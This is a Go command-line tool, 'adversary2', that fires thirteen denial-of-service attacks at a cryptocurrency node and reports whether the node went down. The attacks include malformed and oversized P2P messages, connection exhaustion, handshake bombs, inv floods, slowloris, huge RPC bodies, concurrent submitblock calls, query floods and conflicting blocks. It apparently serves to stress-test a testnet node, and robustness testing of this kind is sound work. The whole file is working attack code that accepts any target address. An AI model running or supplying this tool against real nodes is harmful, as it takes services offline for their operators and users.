package main

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var testnetMagic = [4]byte{0xFA, 0x1C, 0xC0, 0x02}

type result struct {
	Attack  string `json:"attack"`
	Success bool   `json:"success"`
	Detail  string `json:"detail"`
}

func main() {
	target := flag.String("target", "", "Target node address (ip:port for P2P, http://ip:port for RPC)")
	attack := flag.String("attack", "all", "Attack: all, p2p-malformed, p2p-oversize, p2p-conn-exhaust, p2p-handshake-bomb, p2p-inv-flood, p2p-unknown-cmd, p2p-bad-magic, p2p-bad-checksum, p2p-slowloris, rpc-huge-body, rpc-concurrent-submit, rpc-utxo-scan-dos, fork-attempt")
	flag.Parse()

	if *target == "" {
		fmt.Fprintln(os.Stderr, "Usage: adversary2 -target <addr> [-attack <type>]")
		os.Exit(1)
	}

	attacks := map[string]func(string) result{
		"p2p-malformed":       attackP2PMalformed,
		"p2p-oversize":        attackP2POversize,
		"p2p-conn-exhaust":    attackP2PConnExhaust,
		"p2p-handshake-bomb":  attackP2PHandshakeBomb,
		"p2p-inv-flood":       attackP2PInvFlood,
		"p2p-unknown-cmd":     attackP2PUnknownCmd,
		"p2p-bad-magic":       attackP2PBadMagic,
		"p2p-bad-checksum":    attackP2PBadChecksum,
		"p2p-slowloris":       attackP2PSlowloris,
		"rpc-huge-body":       attackRPCHugeBody,
		"rpc-concurrent-submit": attackRPCConcurrentSubmit,
		"rpc-utxo-scan-dos":   attackRPCUtxoScanDoS,
		"fork-attempt":        attackForkAttempt,
	}

	var results []result

	if *attack == "all" {
		for name, fn := range attacks {
			fmt.Fprintf(os.Stderr, "\n=== Running: %s ===\n", name)
			r := fn(*target)
			results = append(results, r)
			fmt.Fprintf(os.Stderr, "  Result: success=%v detail=%s\n", r.Success, r.Detail)
			time.Sleep(500 * time.Millisecond)
		}
	} else {
		for _, name := range strings.Split(*attack, ",") {
			name = strings.TrimSpace(name)
			fn, ok := attacks[name]
			if !ok {
				fmt.Fprintf(os.Stderr, "Unknown attack: %s\n", name)
				continue
			}
			fmt.Fprintf(os.Stderr, "\n=== Running: %s ===\n", name)
			r := fn(*target)
			results = append(results, r)
			fmt.Fprintf(os.Stderr, "  Result: success=%v detail=%s\n", r.Success, r.Detail)
		}
	}

	out, _ := json.MarshalIndent(results, "", "  ")
	fmt.Println(string(out))

	crashed := checkNodeAlive(*target)
	if !crashed {
		fmt.Fprintf(os.Stderr, "\n*** NODE SURVIVED ALL ATTACKS ***\n")
	} else {
		fmt.Fprintf(os.Stderr, "\n!!! NODE APPEARS DOWN - ATTACK SUCCEEDED !!!\n")
	}
}

func doubleSHA256(data []byte) [32]byte {
	first := sha256.Sum256(data)
	return sha256.Sum256(first[:])
}

func writeMessage(conn net.Conn, magic [4]byte, cmd string, payload []byte) error {
	var hdr [24]byte
	copy(hdr[0:4], magic[:])
	var cmdBytes [12]byte
	copy(cmdBytes[:], cmd)
	copy(hdr[4:16], cmdBytes[:])
	binary.LittleEndian.PutUint32(hdr[16:20], uint32(len(payload)))
	checksum := doubleSHA256(payload)
	copy(hdr[20:24], checksum[:4])
	if _, err := conn.Write(hdr[:]); err != nil {
		return err
	}
	if len(payload) > 0 {
		if _, err := conn.Write(payload); err != nil {
			return err
		}
	}
	return nil
}

func readMessageHeader(conn net.Conn, timeout time.Duration) (string, uint32, error) {
	conn.SetReadDeadline(time.Now().Add(timeout))
	var hdr [24]byte
	if _, err := io.ReadFull(conn, hdr[:]); err != nil {
		return "", 0, err
	}
	end := 0
	for i := 4; i < 16; i++ {
		if hdr[i] == 0 {
			break
		}
		end = i - 4 + 1
	}
	cmd := string(hdr[4 : 4+end])
	length := binary.LittleEndian.Uint32(hdr[16:20])
	return cmd, length, nil
}

func readFullMessage(conn net.Conn, timeout time.Duration) (string, []byte, error) {
	conn.SetReadDeadline(time.Now().Add(timeout))
	var hdr [24]byte
	if _, err := io.ReadFull(conn, hdr[:]); err != nil {
		return "", nil, err
	}
	end := 0
	for i := 4; i < 16; i++ {
		if hdr[i] == 0 {
			break
		}
		end = i - 4 + 1
	}
	cmd := string(hdr[4 : 4+end])
	length := binary.LittleEndian.Uint32(hdr[16:20])
	var payload []byte
	if length > 0 {
		if length > 4*1024*1024 {
			return cmd, nil, fmt.Errorf("payload too large: %d", length)
		}
		payload = make([]byte, length)
		if _, err := io.ReadFull(conn, payload); err != nil {
			return cmd, nil, err
		}
	}
	return cmd, payload, nil
}

func doHandshake(conn net.Conn) error {
	conn.SetDeadline(time.Now().Add(15 * time.Second))

	var nonce [8]byte
	rand.Read(nonce[:])

	var versionPayload bytes.Buffer
	binary.Write(&versionPayload, binary.LittleEndian, uint32(1))  // version
	binary.Write(&versionPayload, binary.LittleEndian, uint64(0))  // services
	binary.Write(&versionPayload, binary.LittleEndian, uint64(time.Now().Unix())) // timestamp
	writeVarString(&versionPayload, conn.RemoteAddr().String())    // addr_recv
	writeVarString(&versionPayload, conn.LocalAddr().String())     // addr_from
	versionPayload.Write(nonce[:])                                 // nonce
	writeVarString(&versionPayload, "/adversary2:0.1.0/")         // user_agent
	binary.Write(&versionPayload, binary.LittleEndian, uint32(0)) // start_height

	if err := writeMessage(conn, testnetMagic, "version", versionPayload.Bytes()); err != nil {
		return fmt.Errorf("send version: %w", err)
	}

	// Inbound handshake: node reads our version, sends its version, sends verack, reads our verack
	cmd, _, err := readFullMessage(conn, 10*time.Second)
	if err != nil {
		return fmt.Errorf("read version: %w", err)
	}
	if cmd != "version" {
		return fmt.Errorf("expected version, got %s", cmd)
	}

	cmd, _, err = readFullMessage(conn, 10*time.Second)
	if err != nil {
		return fmt.Errorf("read verack: %w", err)
	}
	if cmd != "verack" {
		return fmt.Errorf("expected verack, got %s", cmd)
	}

	if err := writeMessage(conn, testnetMagic, "verack", nil); err != nil {
		return fmt.Errorf("send verack: %w", err)
	}

	conn.SetDeadline(time.Time{})
	return nil
}

func writeVarString(w *bytes.Buffer, s string) {
	writeVarInt(w, uint64(len(s)))
	w.WriteString(s)
}

func writeVarInt(w *bytes.Buffer, v uint64) {
	if v < 0xFD {
		w.WriteByte(byte(v))
	} else if v <= 0xFFFF {
		w.WriteByte(0xFD)
		var buf [2]byte
		binary.LittleEndian.PutUint16(buf[:], uint16(v))
		w.Write(buf[:])
	} else if v <= 0xFFFFFFFF {
		w.WriteByte(0xFE)
		var buf [4]byte
		binary.LittleEndian.PutUint32(buf[:], uint32(v))
		w.Write(buf[:])
	} else {
		w.WriteByte(0xFF)
		var buf [8]byte
		binary.LittleEndian.PutUint64(buf[:], v)
		w.Write(buf[:])
	}
}

func checkNodeAlive(target string) bool {
	if strings.HasPrefix(target, "http") {
		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Get(target + "/getblockchaininfo")
		if err != nil {
			return true // can't connect = down
		}
		resp.Body.Close()
		// 401 means auth required but node is alive; 200 is obviously alive
		if resp.StatusCode == 200 || resp.StatusCode == 401 {
			return false // alive
		}
		return true
	}
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return true
	}
	conn.Close()
	return false
}

// ============================================================
// P2P ATTACKS
// ============================================================

// Attack 1: Send completely malformed garbage after a valid handshake.
// Goal: crash the message parser or cause a panic.
func attackP2PMalformed(target string) result {
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return result{Attack: "p2p-malformed", Detail: fmt.Sprintf("connect failed: %v", err)}
	}
	defer conn.Close()

	if err := doHandshake(conn); err != nil {
		return result{Attack: "p2p-malformed", Detail: fmt.Sprintf("handshake failed: %v", err)}
	}

	// Send garbage bytes that look like a header but with random payload
	garbage := make([]byte, 4096)
	rand.Read(garbage)
	conn.Write(garbage)

	// Send a header with length=0xFFFFFFFF (just under MaxPayloadSize check)
	var hdr [24]byte
	copy(hdr[0:4], testnetMagic[:])
	copy(hdr[4:16], "block\x00\x00\x00\x00\x00\x00\x00")
	binary.LittleEndian.PutUint32(hdr[16:20], 0xFFFFFFFF)
	conn.Write(hdr[:])

	// Send a header claiming 4MB but with truncated payload
	binary.LittleEndian.PutUint32(hdr[16:20], 4*1024*1024)
	checksum := doubleSHA256([]byte{})
	copy(hdr[20:24], checksum[:4])
	conn.Write(hdr[:])
	conn.Write([]byte("short"))

	time.Sleep(2 * time.Second)

	alive := !checkNodeAlive(target)
	return result{
		Attack:  "p2p-malformed",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - sent garbage, oversized length header, truncated payload", alive),
	}
}

// Attack 2: Send a message with payload claiming to be exactly MaxPayloadSize (4MB)
// filled with random data for every known command type.
func attackP2POversize(target string) result {
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return result{Attack: "p2p-oversize", Detail: fmt.Sprintf("connect failed: %v", err)}
	}
	defer conn.Close()

	if err := doHandshake(conn); err != nil {
		return result{Attack: "p2p-oversize", Detail: fmt.Sprintf("handshake failed: %v", err)}
	}

	commands := []string{"block", "tx", "inv", "getdata", "getblocks", "addr", "ping", "pong"}
	bigPayload := make([]byte, 4*1024*1024)
	rand.Read(bigPayload)

	sent := 0
	for _, cmd := range commands {
		err := writeMessage(conn, testnetMagic, cmd, bigPayload)
		if err != nil {
			break
		}
		sent++
	}

	time.Sleep(2 * time.Second)
	alive := !checkNodeAlive(target)
	return result{
		Attack:  "p2p-oversize",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - sent %d 4MB messages", alive, sent),
	}
}

// Attack 3: Open many connections simultaneously to exhaust inbound slots.
func attackP2PConnExhaust(target string) result {
	var conns []net.Conn
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			conn, err := net.DialTimeout("tcp", target, 5*time.Second)
			if err != nil {
				return
			}
			if err := doHandshake(conn); err != nil {
				conn.Close()
				return
			}
			mu.Lock()
			conns = append(conns, conn)
			mu.Unlock()
		}(i)
	}
	wg.Wait()

	established := len(conns)

	// Try one more connection — should be rejected if slots are full
	testConn, err := net.DialTimeout("tcp", target, 3*time.Second)
	extraConnected := err == nil
	if extraConnected {
		testConn.Close()
	}

	for _, c := range conns {
		c.Close()
	}

	time.Sleep(1 * time.Second)
	alive := !checkNodeAlive(target)
	return result{
		Attack:  "p2p-conn-exhaust",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - established %d connections, extra_conn=%v", alive, established, extraConnected),
	}
}

// Attack 4: Rapid handshake-then-disconnect to stress the handshake path.
func attackP2PHandshakeBomb(target string) result {
	var completed int32
	var wg sync.WaitGroup

	for i := 0; i < 200; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.DialTimeout("tcp", target, 3*time.Second)
			if err != nil {
				return
			}
			// Send version then immediately close
			var nonce [8]byte
			rand.Read(nonce[:])
			var vp bytes.Buffer
			binary.Write(&vp, binary.LittleEndian, uint32(1))
			binary.Write(&vp, binary.LittleEndian, uint64(0))
			binary.Write(&vp, binary.LittleEndian, uint64(time.Now().Unix()))
			writeVarString(&vp, conn.RemoteAddr().String())
			writeVarString(&vp, "0.0.0.0:0")
			vp.Write(nonce[:])
			writeVarString(&vp, "/bomb/")
			binary.Write(&vp, binary.LittleEndian, uint32(0))
			writeMessage(conn, testnetMagic, "version", vp.Bytes())
			conn.Close()
			atomic.AddInt32(&completed, 1)
		}()
	}
	wg.Wait()

	time.Sleep(2 * time.Second)
	alive := !checkNodeAlive(target)
	return result{
		Attack:  "p2p-handshake-bomb",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - %d rapid handshake+disconnect cycles", alive, completed),
	}
}

// Attack 5: After handshake, flood inv messages with 50,000 items each.
// Exploits the rate-limit bypass where messages are still processed before ban.
func attackP2PInvFlood(target string) result {
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return result{Attack: "p2p-inv-flood", Detail: fmt.Sprintf("connect failed: %v", err)}
	}
	defer conn.Close()

	if err := doHandshake(conn); err != nil {
		return result{Attack: "p2p-inv-flood", Detail: fmt.Sprintf("handshake failed: %v", err)}
	}

	// Build an inv message with 50,000 random block hashes
	var payload bytes.Buffer
	writeVarInt(&payload, 50000)
	for i := 0; i < 50000; i++ {
		binary.Write(&payload, binary.LittleEndian, uint32(1)) // InvTypeBlock
		var hash [32]byte
		rand.Read(hash[:])
		payload.Write(hash[:])
	}
	invBytes := payload.Bytes()

	sent := 0
	for i := 0; i < 600; i++ {
		err := writeMessage(conn, testnetMagic, "inv", invBytes)
		if err != nil {
			break
		}
		sent++
	}

	time.Sleep(3 * time.Second)
	alive := !checkNodeAlive(target)
	return result{
		Attack:  "p2p-inv-flood",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - sent %d inv messages (50k items each = %d total items)", alive, sent, sent*50000),
	}
}

// Attack 6: Send messages with unknown command names.
func attackP2PUnknownCmd(target string) result {
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return result{Attack: "p2p-unknown-cmd", Detail: fmt.Sprintf("connect failed: %v", err)}
	}
	defer conn.Close()

	if err := doHandshake(conn); err != nil {
		return result{Attack: "p2p-unknown-cmd", Detail: fmt.Sprintf("handshake failed: %v", err)}
	}

	unknownCmds := []string{"exploit", "crashme", "AAAAAAAAAAAA", "\x00\x00\x00\x00", "getblocks2", "supersecret"}
	sent := 0
	for _, cmd := range unknownCmds {
		payload := make([]byte, 100)
		rand.Read(payload)
		if err := writeMessage(conn, testnetMagic, cmd, payload); err != nil {
			break
		}
		sent++
	}

	time.Sleep(2 * time.Second)
	alive := !checkNodeAlive(target)
	return result{
		Attack:  "p2p-unknown-cmd",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - sent %d unknown commands", alive, sent),
	}
}

// Attack 7: Send messages with wrong network magic.
func attackP2PBadMagic(target string) result {
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return result{Attack: "p2p-bad-magic", Detail: fmt.Sprintf("connect failed: %v", err)}
	}
	defer conn.Close()

	// Try handshake with mainnet magic
	mainnetMagic := [4]byte{0xFA, 0x1C, 0xC0, 0x01}
	var nonce [8]byte
	rand.Read(nonce[:])
	var vp bytes.Buffer
	binary.Write(&vp, binary.LittleEndian, uint32(1))
	binary.Write(&vp, binary.LittleEndian, uint64(0))
	binary.Write(&vp, binary.LittleEndian, uint64(time.Now().Unix()))
	writeVarString(&vp, conn.RemoteAddr().String())
	writeVarString(&vp, "0.0.0.0:0")
	vp.Write(nonce[:])
	writeVarString(&vp, "/badmagic/")
	binary.Write(&vp, binary.LittleEndian, uint32(99999))
	writeMessage(conn, mainnetMagic, "version", vp.Bytes())

	// Also send random magic
	randomMagic := [4]byte{0xDE, 0xAD, 0xBE, 0xEF}
	writeMessage(conn, randomMagic, "version", vp.Bytes())

	time.Sleep(2 * time.Second)
	alive := !checkNodeAlive(target)
	return result{
		Attack:  "p2p-bad-magic",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - sent mainnet and random magic version messages", alive),
	}
}

// Attack 8: Send messages with valid header but corrupted checksum.
func attackP2PBadChecksum(target string) result {
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return result{Attack: "p2p-bad-checksum", Detail: fmt.Sprintf("connect failed: %v", err)}
	}
	defer conn.Close()

	if err := doHandshake(conn); err != nil {
		return result{Attack: "p2p-bad-checksum", Detail: fmt.Sprintf("handshake failed: %v", err)}
	}

	payload := []byte("this is a ping with bad checksum")
	var hdr [24]byte
	copy(hdr[0:4], testnetMagic[:])
	copy(hdr[4:16], "ping\x00\x00\x00\x00\x00\x00\x00\x00")
	binary.LittleEndian.PutUint32(hdr[16:20], uint32(len(payload)))
	// Deliberately wrong checksum
	copy(hdr[20:24], []byte{0xDE, 0xAD, 0xBE, 0xEF})

	sent := 0
	for i := 0; i < 100; i++ {
		if _, err := conn.Write(hdr[:]); err != nil {
			break
		}
		if _, err := conn.Write(payload); err != nil {
			break
		}
		sent++
	}

	time.Sleep(2 * time.Second)
	alive := !checkNodeAlive(target)
	return result{
		Attack:  "p2p-bad-checksum",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - sent %d messages with bad checksums", alive, sent),
	}
}

// Attack 9: Slowloris — open connections and send data extremely slowly.
func attackP2PSlowloris(target string) result {
	var conns []net.Conn
	var mu sync.Mutex

	for i := 0; i < 30; i++ {
		conn, err := net.DialTimeout("tcp", target, 5*time.Second)
		if err != nil {
			continue
		}
		mu.Lock()
		conns = append(conns, conn)
		mu.Unlock()

		go func(c net.Conn) {
			// Send version header one byte at a time, very slowly
			var nonce [8]byte
			rand.Read(nonce[:])
			var vp bytes.Buffer
			binary.Write(&vp, binary.LittleEndian, uint32(1))
			binary.Write(&vp, binary.LittleEndian, uint64(0))
			binary.Write(&vp, binary.LittleEndian, uint64(time.Now().Unix()))
			writeVarString(&vp, c.RemoteAddr().String())
			writeVarString(&vp, "0.0.0.0:0")
			vp.Write(nonce[:])
			writeVarString(&vp, "/slowloris/")
			binary.Write(&vp, binary.LittleEndian, uint32(0))

			// Build the full message
			var msg bytes.Buffer
			var hdr [24]byte
			copy(hdr[0:4], testnetMagic[:])
			copy(hdr[4:16], "version\x00\x00\x00\x00\x00")
			binary.LittleEndian.PutUint32(hdr[16:20], uint32(vp.Len()))
			checksum := doubleSHA256(vp.Bytes())
			copy(hdr[20:24], checksum[:4])
			msg.Write(hdr[:])
			msg.Write(vp.Bytes())

			data := msg.Bytes()
			for _, b := range data {
				c.Write([]byte{b})
				time.Sleep(200 * time.Millisecond)
			}
		}(conn)
	}

	// Hold connections for 15 seconds
	time.Sleep(15 * time.Second)

	for _, c := range conns {
		c.Close()
	}

	alive := !checkNodeAlive(target)
	return result{
		Attack:  "p2p-slowloris",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - held %d slowloris connections for 15s", alive, len(conns)),
	}
}

// ============================================================
// RPC ATTACKS
// ============================================================

// Attack 10: Send a huge POST body to /submitblock to try to exhaust memory.
func attackRPCHugeBody(target string) result {
	rpcAddr := target
	if !strings.HasPrefix(rpcAddr, "http") {
		rpcAddr = "http://" + rpcAddr
	}

	// Send a 50MB body of random data
	bodySize := 50 * 1024 * 1024
	body := make([]byte, bodySize)
	rand.Read(body)

	resp, err := http.Post(rpcAddr+"/submitblock", "application/octet-stream", bytes.NewReader(body))
	if err != nil {
		return result{
			Attack:  "rpc-huge-body",
			Success: false,
			Detail:  fmt.Sprintf("request failed (may have been rejected): %v", err),
		}
	}
	resp.Body.Close()

	time.Sleep(2 * time.Second)
	alive := !checkNodeAlive(target)
	return result{
		Attack:  "rpc-huge-body",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - sent %dMB body, response=%d", alive, bodySize/1024/1024, resp.StatusCode),
	}
}

// Attack 11: Concurrent submitblock calls to stress the chain lock.
func attackRPCConcurrentSubmit(target string) result {
	rpcAddr := target
	if !strings.HasPrefix(rpcAddr, "http") {
		rpcAddr = "http://" + rpcAddr
	}

	// Craft a minimal but invalid block payload
	var block bytes.Buffer
	// Block header (80 bytes of zeros)
	block.Write(make([]byte, 80))
	// tx count = 0 (varint)
	block.WriteByte(0x00)

	payload := block.Bytes()

	var wg sync.WaitGroup
	var errors int32
	var successes int32

	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			resp, err := http.Post(rpcAddr+"/submitblock", "application/octet-stream", bytes.NewReader(payload))
			if err != nil {
				atomic.AddInt32(&errors, 1)
				return
			}
			resp.Body.Close()
			if resp.StatusCode == 200 {
				atomic.AddInt32(&successes, 1)
			} else {
				atomic.AddInt32(&errors, 1)
			}
		}()
	}
	wg.Wait()

	time.Sleep(2 * time.Second)
	alive := !checkNodeAlive(target)
	return result{
		Attack:  "rpc-concurrent-submit",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - 100 concurrent submitblock calls, errors=%d", alive, errors),
	}
}

// Attack 12: Repeated expensive UTXO scan queries.
func attackRPCUtxoScanDoS(target string) result {
	rpcAddr := target
	if !strings.HasPrefix(rpcAddr, "http") {
		rpcAddr = "http://" + rpcAddr
	}

	var wg sync.WaitGroup
	var completed int32

	endpoints := []string{
		"/gettxoutsetinfo",
		"/getreceivedbyaddress?address=n4dtCQD9nJepk3Wq5zQixKEmmwVeTMh5V6",
		"/gettransaction?txid=0000000000000000000000000000000000000000000000000000000000000000",
		"/listaddressgroupings",
	}

	for i := 0; i < 200; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			ep := endpoints[idx%len(endpoints)]
			resp, err := http.Get(rpcAddr + ep)
			if err != nil {
				return
			}
			resp.Body.Close()
			atomic.AddInt32(&completed, 1)
		}(i)
	}
	wg.Wait()

	time.Sleep(2 * time.Second)
	alive := !checkNodeAlive(target)
	return result{
		Attack:  "rpc-utxo-scan-dos",
		Success: !alive,
		Detail:  fmt.Sprintf("node_alive=%v - %d concurrent UTXO scan queries completed", alive, completed),
	}
}

// ============================================================
// CONSENSUS / FORK ATTACKS
// ============================================================

// Attack 13: Attempt to cause a fork by connecting to multiple seed nodes
// and feeding them different blocks at the same height.
func attackForkAttempt(target string) result {
	// Parse target as comma-separated list of P2P addresses
	targets := strings.Split(target, ",")
	if len(targets) < 2 {
		return result{
			Attack: "fork-attempt",
			Detail: "need at least 2 comma-separated P2P targets to attempt fork (e.g. ip1:port,ip2:port)",
		}
	}

	var conns []net.Conn
	for _, t := range targets {
		t = strings.TrimSpace(t)
		conn, err := net.DialTimeout("tcp", t, 5*time.Second)
		if err != nil {
			return result{
				Attack: "fork-attempt",
				Detail: fmt.Sprintf("connect to %s failed: %v", t, err),
			}
		}
		if err := doHandshake(conn); err != nil {
			conn.Close()
			return result{
				Attack: "fork-attempt",
				Detail: fmt.Sprintf("handshake with %s failed: %v", t, err),
			}
		}
		conns = append(conns, conn)
	}
	defer func() {
		for _, c := range conns {
			c.Close()
		}
	}()

	// Build two different blocks at the same height (height 1) with different
	// coinbase scriptSigs but same parent (genesis). Neither will have valid PoW,
	// but we're testing if the node handles conflicting blocks gracefully.
	for i, conn := range conns {
		var blockBuf bytes.Buffer

		// Block header
		var header [80]byte
		binary.LittleEndian.PutUint32(header[0:4], 1) // version
		// prevblock = zeros (genesis parent — won't match real genesis)
		binary.LittleEndian.PutUint32(header[68:72], 0x1e0fffff) // bits
		binary.LittleEndian.PutUint32(header[72:76], uint32(time.Now().Unix()))
		binary.LittleEndian.PutUint32(header[76:80], uint32(i*1000+1)) // different nonce per node
		blockBuf.Write(header[:])

		// 1 transaction (coinbase)
		blockBuf.WriteByte(0x01)

		// Transaction
		binary.Write(&blockBuf, binary.LittleEndian, uint32(1)) // tx version
		blockBuf.WriteByte(0x01) // 1 input
		blockBuf.Write(make([]byte, 32)) // prevout hash (coinbase)
		binary.Write(&blockBuf, binary.LittleEndian, uint32(0xFFFFFFFF)) // prevout index
		scriptSig := []byte(fmt.Sprintf("\x04\x01\x00\x00\x00fork-node-%d", i))
		blockBuf.WriteByte(byte(len(scriptSig)))
		blockBuf.Write(scriptSig)
		binary.Write(&blockBuf, binary.LittleEndian, uint32(0xFFFFFFFF)) // sequence
		blockBuf.WriteByte(0x01) // 1 output
		binary.Write(&blockBuf, binary.LittleEndian, uint64(50000000)) // value
		pkScript := []byte{0x00}
		blockBuf.WriteByte(byte(len(pkScript)))
		blockBuf.Write(pkScript)
		binary.Write(&blockBuf, binary.LittleEndian, uint32(0)) // locktime

		writeMessage(conn, testnetMagic, "block", blockBuf.Bytes())
	}

	time.Sleep(3 * time.Second)

	// Check both nodes are still alive and on the same chain
	allAlive := true
	for _, t := range targets {
		t = strings.TrimSpace(t)
		if checkNodeAlive(t) {
			allAlive = false
		}
	}

	return result{
		Attack:  "fork-attempt",
		Success: !allAlive,
		Detail:  fmt.Sprintf("all_nodes_alive=%v - sent different blocks to %d nodes", allAlive, len(targets)),
	}
}
